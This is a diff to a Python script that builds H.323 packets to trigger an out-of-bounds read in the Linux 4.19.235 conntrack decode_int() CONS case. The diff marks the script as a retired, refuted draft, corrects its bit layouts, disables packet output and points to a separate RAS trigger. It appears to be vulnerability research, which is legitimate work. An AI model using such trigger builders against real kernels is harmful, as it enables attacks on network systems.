@@ -1,6 +1,18 @@
 #!/usr/bin/env python3
-"""Oracle + trigger for the un-backported decode_int() CONS OOB read
-(upstream fix 1e3a3593162c96e8 "fix OOB read in decode_int() CONS case").
+"""RETIRED: historical, invalid H.245 CONS trigger draft.
+
+This file must not be used to claim or exercise the live decode_int() CONS
+target. Exact Linux v4.19.235 tables mark the H.245 videoBitRate field as
+SKIP, so decode_int() does not read it. In addition, this builder wraps its
+H.245 content in ReleaseComplete, which does not cause process_setup() to
+parse h245Control. The advertised OOB path is therefore unreachable through
+these packets. The valid active CONS targets found so far are RAS TTL fields;
+see h323_ras_cons_trigger.py.
+
+The implementation below is retained only as the historical draft for
+reviewing the original mistake. Running it will not build or print packets.
+
+Original hypothesis (refuted; upstream fix 1e3a3593162c96e8):
 
 decode_int() CONS case in nf_conntrack_h323_asn1.c (4.19.235):
     len = get_bits(bs, 2) + 1;     /* 1..4  */
@@ -22,7 +34,7 @@ Three packets:
   B  full valid OLC, CONS in-bounds         -> oracle: rtp/rtcp expectations
                                               (5555/5556)
   T  same as B truncated right after the 2-bit CONS length field (=3), so
-     get_uint reads 3 bytes past the end   -> OOB read; decode then fails
+     len = field + 1 = 4; get_uint reads 4 bytes past the end -> OOB read; decode then fails
      cleanly (BOUND) -> no expectations, no crash expected.
 """
 
@@ -62,6 +74,12 @@ def uu_pdu_common(w, body_index_3bit, body_builder):
 
 
 def wrap_tpkt(q931_payload, msgtype=0x05):
+    """Wrap H.323 UserInformation for this kernel's Q.931 decoder.
+
+    The shipped nf_conntrack_h323 DecodeQ931 reads the User-user IE length as
+    a big-endian 16-bit value (a nonstandard divergence from Q.931), then
+    skips the 0x05 user-user protocol discriminator before decoding PER.
+    """
     body = bytes([0x08, 0x00, msgtype, 0x7e]) + \
         (1 + len(q931_payload)).to_bytes(2, "big") + b"\x05" + q931_payload
     return bytes([0x03, 0x00]) + (4 + len(body)).to_bytes(2, "big") + body
@@ -82,7 +100,7 @@ def build_oracle_a(ip=b"\xc0\xa8\x01\x96", port=4444):
     w.bits_msb(1, 3)               # index 1 = callProceeding
     # CallProceeding-UUIe SEQ {sz=2, lb=5, EXT}
     w.bit(0)                       # ext = 0
-    w.bits_msb(0b01, 2)            # bmp: h245Address present (bit1)
+    w.bits_msb(0b10, 2)            # first optional = h245Address (MSB first)
     # protocolIdentifier OID (BYTE): align + len + bytes
     w.bytes_(bytes([6]) + b"\x00" * 6)
     # h245Address CHOICE {sz=3, lb=7, EXT} over _TransportAddress
@@ -168,7 +186,7 @@ def build_oracle_b():
     w.bytes_(bytes([6]) + b"\x00" * 6)   # protocolIdentifier OID
     # UU_PDU extension block
     w.bits_msb(2, 7)               # bmp2_len - 1 = 2 -> 3 bits
-    w.bits_msb(0b010, 3)           # bit2 = h245Control (children i=2,3,4)
+    w.bits_msb(0b001, 3)           # third extension = h245Control
     w.align()
     # h245Control ext component: get_len prefix, then SEQOF content
     seqof_bits_placeholder = None
@@ -203,7 +221,7 @@ def build_trigger():
     w.bits_msb(0, 1)               # reason absent
     w.bytes_(bytes([6]) + b"\x00" * 6)   # protocolIdentifier OID
     w.bits_msb(2, 7)               # bmp2_len - 1 = 2
-    w.bits_msb(0b010, 3)           # h245Control present
+    w.bits_msb(0b001, 3)           # third extension = h245Control
     w.align()
     mscm = BW()
     build_mscm_olc(mscm, truncated_at_cons=True, cons_len_field=3)
@@ -259,7 +277,7 @@ def simulate_oracle_a(buf):
     assert s.gb(3) == 1            # callProceeding
     assert s.gb(1) == 0            # CallProc ext
     bmp = s.gb(2)
-    assert bmp == 0b01, bin(bmp)   # h245Address present
+    assert bmp == 0b10, bin(bmp)   # first optional, h245Address, present
     s.skip(1); s.skip(6)           # protocolIdentifier OID
     assert s.gb(1) == 0            # h245Address ext
     assert s.gb(3) == 0            # unicastAddress
@@ -330,7 +348,7 @@ def simulate_oracle_b(buf):
     assert s.gb(1) == 0            # reason absent
     s.skip(1); s.skip(6)           # protocolIdentifier OID
     assert s.gb(7) + 1 == 3        # bmp2_len
-    assert s.gb(3) == 0b010        # h245Control bit
+    assert s.gb(3) == 0b001        # third extension = h245Control
     s.align()
     ext_len = s.glen()
     assert ext_len == s.n - s.cur, (ext_len, s.n - s.cur)  # covers rest
@@ -354,7 +372,7 @@ def simulate_trigger(buf):
     assert s.gb(1) == 0
     s.skip(1); s.skip(6)
     assert s.gb(7) + 1 == 3
-    assert s.gb(3) == 0b010
+    assert s.gb(3) == 0b001
     s.align()
     s.glen()                       # ext component len
     assert s.glen() == 1           # SEQOF count
@@ -363,13 +381,8 @@ def simulate_trigger(buf):
 
 
 if __name__ == "__main__":
-    a = build_oracle_a()
-    b = build_oracle_b()
-    t = build_trigger()
-    print("oracle A:", len(a), a.hex())
-    print("oracle B:", len(b), b.hex())
-    print("trigger :", len(t), t.hex())
-    print("trigger ends at CONS len field; last byte", hex(t[-1]))
-    print("sim A:", simulate_oracle_a(a))
-    print("sim B:", simulate_oracle_b(b))
-    print("sim T:", simulate_trigger(t))
+    raise SystemExit(
+        "Retired draft: exact v4.19.235 tables mark videoBitRate CONS as "
+        "SKIP, and these packets do not enter process_h245. Use the RAS "
+        "builder for the currently verified target path."
+    )
